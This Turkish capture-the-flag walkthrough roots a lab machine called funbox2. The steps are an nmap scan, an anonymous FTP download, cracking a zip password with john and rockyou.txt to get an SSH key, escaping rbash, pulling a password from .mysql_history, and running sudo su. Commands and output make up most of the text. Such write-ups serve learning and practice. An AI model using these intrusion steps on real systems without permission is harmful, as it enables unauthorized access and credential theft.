      ####enumeration

Nmap
Bir tarama çalıştırarak başlıyoruz :
kali@kali:~$ sudo nmap $targetip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 13:07 EDT
Nmap scan report for $targetip
Host is up (0.032s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Bulunan bağlantı noktalarına karşı bayrakla daha ayrıntılı bir nmaptarama yapabiliriz:-sC
kali@kali:~$ sudo nmap -p 21,22,80 $targetip -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 13:09 EDT
Nmap scan report for $targetip
Host is up (0.030s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:52 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:58 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:50 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25 10:44 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25 10:51 zlatan.zip
22/tcp open  ssh
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-title: Apache2 Ubuntu Default Page: It works
Varsayılan bağlantı noktasını dinleyen FTP sunucusu, anonim oturum açmalara izin verir ve listelenmiş birkaç zip dosyası görüyoruz.

      ####exploitation

Anonim FTP Sunucusu
Taramada gösterilen dosyalardan yalnızca tom.zip dosyası bizim için yararlı olacaktır. Ardından, giriş yapabilir ve bilgi alabiliriz:
kali@kali:~$ ftp $targetip
Connected to $targetip.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:$targetip]
Name ($targetip:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@$targetip !
230-
230-The local time is: Wed Oct 14 17:11:13 2020
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get tom.zip
local: tom.zip remote: tom.zip
200 PORT command successful
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
226 Transfer complete
1477 bytes received in 0.00 secs (28.1715 MB/s)
ftp> bye
221 Goodbye.
kali@kali:~$ 
Ancak arşivi açmaya çalışırsak şifre korumalı olduğunu görürüz.

      #####Password Bruteforce
zip2johnŞifrelenmiş arşivi aşağıdakiler tarafından kullanılabilen bir karma dosyaya dönüştürmek için john aracını kullanabiliriz:
kali@kali:~$ zip2john tom.zip > tom.hash
ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6
kali@kali:~$
Artık şifreyi kırmak johniçin rockyou.txt wordlist'i kullanabiliriz:
kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt tom.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
$passwordcensored           (tom.zip/id_rsa)
1g 0:00:00:00 DONE (2020-10-14 13:17) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~$
Password kırma işlemi başarılı olur ve şifre ele geçirildi. Bunu kullanarak arşivin kilidini açabiliriz:
kali@kali:~$ unzip -P $passwordcensored tom.zip
Archive:  tom.zip
  inflating: id_rsa
Özel bir SSH anahtar dosyası id_rsa elde ettik.

      ####SSH LOGIN WITH ID_RSA KEY
Özel anahtarı tom.zip arşivinden aldığımız için, kullanıcının tom olduğunu varsayabiliriz. Ardından, uygun anahtar dosya izinlerini ve ardından hedefe SSH'yi ayarlayacağız:
kali@kali:~$ chmod 0600 id_rsa
kali@kali:~$
kali@kali:~$ ssh -o StrictHostKeyChecking=no -i id_rsa tom@$targetip
...
tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
tom@funbox2:~$

      ####Kısıtlı Kabuktan Kaçmak
Ancak, dizini veya diğer kısıtlanmış komutlardan herhangi birini değiştirmeyi denerseniz, oturum açma sırasında varsayılan kabuğumuzun rbash, önce kaçmamız gerektiğini bulacağız:
tom@funbox2:~$ pwd
/home/tom
tom@funbox2:~$ cd ..
-rbash: cd: restricted
tom@funbox2:~$
Bunu yapmanın birçok yolu vardır ve en kolay olanlarından birini seçeceğiz (mevcut kabuktan çıkmak ve ardından flag ile yeniden bağlantı kurmak -t "bash --noprofile"):
tom@funbox2:~$ exit
logout
-rbash: /usr/bin/clear_console: restricted: cannot specify `/' in command names
Connection to $targetip closed.
kali@kali:~$
kali@kali:~$ ssh -o StrictHostKeyChecking=no -i id_rsa tom@$targetip -t "bash --noprofile"
load pubkey "id_rsa": invalid format
tom@funbox2:~$ pwd
/home/tom
tom@funbox2:~$ cd ..
tom@funbox2:/home$
Artık sistemi daha da ilerletebilir ve numaralandırabiliriz.

      ####Kullanıcı Şifresi Bulmak
Kullanıcının ana dizinine baktığımızda bir MySQL geçmiş dosyası buluyoruz:
tom@funbox2:/home$ cd ~
tom@funbox2:~$ ls -la
...
-rw------- 1 tom  tom   295 Jul 25 12:04 .mysql_history
...
tom@funbox2:~$
Bu dosyada birkaç MySQL komutunun geçmişini görüyoruz:
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
tom@funbox2:~$
Komut , parola gibi görünen bir insert\040into\040support\040(tom,\040xx11yy22!);dize içerdiğinden çok ilginç görünüyor.xx11yy22!

      ####Sudo Yükseltme
Kullanıcının sudo ayrıcalıklarını sıralamak için parola denemesi işe yarar ve kullanıcının tom parolasını sağlayarak sudo ile herhangi bir komutu çalıştırabildiğini görüyoruz:
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
tom@funbox2:~$
Bunu bir kök kabuğu elde etmek için kolayca kullanabiliriz:
tom@funbox2:~$ sudo su
root@funbox2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)
root@funbox2:/home/tom# whoami
#root
